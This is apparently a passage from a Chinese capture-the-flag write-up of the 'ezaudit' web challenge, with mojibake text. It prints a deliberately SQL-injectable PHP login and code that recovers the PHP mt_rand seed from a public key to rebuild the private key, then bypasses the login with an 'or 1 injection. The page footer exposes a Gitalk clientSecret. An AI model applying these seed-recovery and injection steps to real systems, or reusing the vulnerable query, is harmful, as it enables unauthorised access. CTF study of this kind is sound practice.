    <span style=color:#66d9ef>if</span> (($username <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;&#39;</span>) <span style=color:#f92672>||</span> ($password <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;&#39;</span>) <span style=color:#f92672>||</span>($Private_key <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;&#39;</span>)) {
        <span style=color:#75715e>// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢
</span><span style=color:#75715e></span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;refresh:2; url=login.html&#39;</span>);
        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&#34;</span>;
        <span style=color:#66d9ef>exit</span>;
}
    <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>($Private_key <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;*************&#39;</span> )
    {
        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;refresh:2; url=login.html&#39;</span>);
        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&#34;</span>;
        <span style=color:#66d9ef>exit</span>;
    }

    <span style=color:#66d9ef>else</span>{
        <span style=color:#66d9ef>if</span>($Private_key <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;************&#39;</span>){
        $getuser <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT flag FROM user WHERE username= &#39;crispr&#39; AND password = &#39;</span><span style=color:#e6db74>$password</span><span style=color:#e6db74>&#39;&#34;</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#39;;&#39;</span>; 
        $link<span style=color:#f92672>=</span><span style=color:#a6e22e>mysql_connect</span>(<span style=color:#e6db74>&#34;localhost&#34;</span>,<span style=color:#e6db74>&#34;root&#34;</span>,<span style=color:#e6db74>&#34;root&#34;</span>);
        <span style=color:#a6e22e>mysql_select_db</span>(<span style=color:#e6db74>&#34;test&#34;</span>,$link);
        $result <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysql_query</span>($getuser);
        <span style=color:#66d9ef>while</span>($row<span style=color:#f92672>=</span><span style=color:#a6e22e>mysql_fetch_assoc</span>($result)){
            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;tr&gt;&lt;td&gt;&#34;</span><span style=color:#f92672>.</span>$row[<span style=color:#e6db74>&#34;username&#34;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/td&gt;&lt;td&gt;&#34;</span><span style=color:#f92672>.</span>$row[<span style=color:#e6db74>&#34;flag&#34;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/td&gt;&lt;td&gt;&#34;</span>;
        }
    }
    }

} 
<span style=color:#75715e>// genarate public_key 
</span><span style=color:#75715e></span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>public_key</span>($length <span style=color:#f92672>=</span> <span style=color:#ae81ff>16</span>) {
    $strings1 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span>;
    $public_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
    <span style=color:#66d9ef>for</span> ( $i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> $length; $i<span style=color:#f92672>++</span> )
    $public_key <span style=color:#f92672>.=</span> <span style=color:#a6e22e>substr</span>($strings1, <span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>strlen</span>($strings1) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>1</span>);
    <span style=color:#66d9ef>return</span> $public_key;
  }

  <span style=color:#75715e>//genarate private_key
</span><span style=color:#75715e></span>  <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>private_key</span>($length <span style=color:#f92672>=</span> <span style=color:#ae81ff>12</span>) {
    $strings2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span>;
    $private_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
    <span style=color:#66d9ef>for</span> ( $i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> $length; $i<span style=color:#f92672>++</span> )
    $private_key <span style=color:#f92672>.=</span> <span style=color:#a6e22e>substr</span>($strings2, <span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>strlen</span>($strings2) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>1</span>);
    <span style=color:#66d9ef>return</span> $private_key;
  }
  $Public_key <span style=color:#f92672>=</span> <span style=color:#a6e22e>public_key</span>();
  <span style=color:#75715e>//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#39;s private_key???
</span></code></pre></div><p>å…³é”®æ˜¯å¯†é’¥ï¼Œæ–‡ä»¶æœ€åä¸¤ä¸ªå‡½æ•°ç»™å‡ºäº†å¯†é’¥çš„ç®—æ³•ï¼ŒåŒæ—¶ç»™å‡ºäº†å…¬é’¥ã€‚å¯ä»¥çœ‹å‡ºç§é’¥çš„åŠ å¯†ç®—æ³•æœ€ä¸»è¦æ˜¯ä¸€ä¸ª <strong>mt_rand()</strong> å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°åœ¨å…¬é’¥ç”Ÿæˆç®—æ³•ä¸­ä¹Ÿè¢«ä½¿ç”¨äº†ã€‚é¢˜ç›®ç»™å‡ºäº†å…¬é’¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å…¶å®æ˜¯è¦æ ¹æ®å…¬é’¥è®¡ç®—å‡ºéšæœºæ•°ç§å­ï¼Œç„¶åæ ¹æ®è¿™ä¸ªç§å­å†ç”Ÿæˆç§é’¥ã€‚
å…ˆç®—å‡ºéšæœºæ•°ï¼š</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>strings1 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span>Public_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;KVQP0LdJKRaV3n9D&#39;</span>seed <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> Public_key:    loc <span style=color:#f92672>=</span> strings1<span style=color:#f92672>.</span>find(i)    seed <span style=color:#f92672>=</span> str(loc)<span style=color:#f92672>+</span><span style=color:#e6db74>&#39; &#39;</span>    print(seed<span style=color:#f92672>+</span>seed<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;0 &#39;</span><span style=color:#f92672>+</span>str(len(strings1)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>+</span><span style=color:#e6db74>&#39; &#39;</span>,end<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>)<span style=color:#75715e># 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span>
</code></pre></div><p>æŠŠç»“æœäº¤ç»™ php_mt_seed çˆ†ç ´ï¼Œå¾—åˆ°ç§å­ <strong>1775196155</strong>
<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/mrctf/ezaudit2.png alt=ezaudit>
æ¥ä¸‹æ¥æ ¹æ®ç§å­å’ŒåŠ å¯†ç®—æ³•è®¡ç®—ç§é’¥ï¼š</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#a6e22e>mt_srand</span>(<span style=color:#ae81ff>1775196155</span>);$Public_key <span style=color:#f92672>=</span> <span style=color:#a6e22e>public_key</span>();<span style=color:#66d9ef>echo</span> $Public_key<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;&lt;br/&gt;&#39;</span>;<span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>private_key</span>();<span style=color:#75715e>// KVQP0LdJKRaV3n9D// XuNhoueCDCGc
</span></code></pre></div><p>ç„¶åæ˜¯ä¸€ä¸ªç®€å•çš„ sql æ³¨å…¥ï¼Œä½¿ç”¨ &lsquo;or 1&rsquo; å°±è¡Œï¼š
<img src=https://causality-hugo.oss-cn-hangzhou.aliyuncs.com/security/writeup/mrctf/ezaudit3.png alt=ezaudit3></p>
</div>
</div>
<div class="w-200 ml-2 mr-auto px-4">
<div id=gitalk></div>
<script>var gitalk=new Gitalk({clientID:'9a04c6b451fbce76511d',clientSecret:'430c540c77ecd6b59749c60f0341c057bd5320a0',repo:'Causa1ity.github.io',owner:'Causa1ity',admin:'Causa1ity',id:'MRCTF Web éƒ¨åˆ†é¢˜è§£',distractionFreeMode:!1});gitalk.render('gitalk')</script>
</div>
</div>
</div>
<script>CodeLine.initOnPageLoad({copyBtn:{show:!0,position:'top'},toggleBtn:{show:!1}})</script>
<div class="text-center my-8">
<span class="font-serif text-lg">
Powered By <a href=https://gohugo.io/ class="font-bold hover:text-blue-400">Hugo</a>
with theme <a href=https://github.com/causa1ity/hugo-theme-noth/ class="font-bold hover:text-blue-400">Noth</a>
</span>
</div></body>
</html>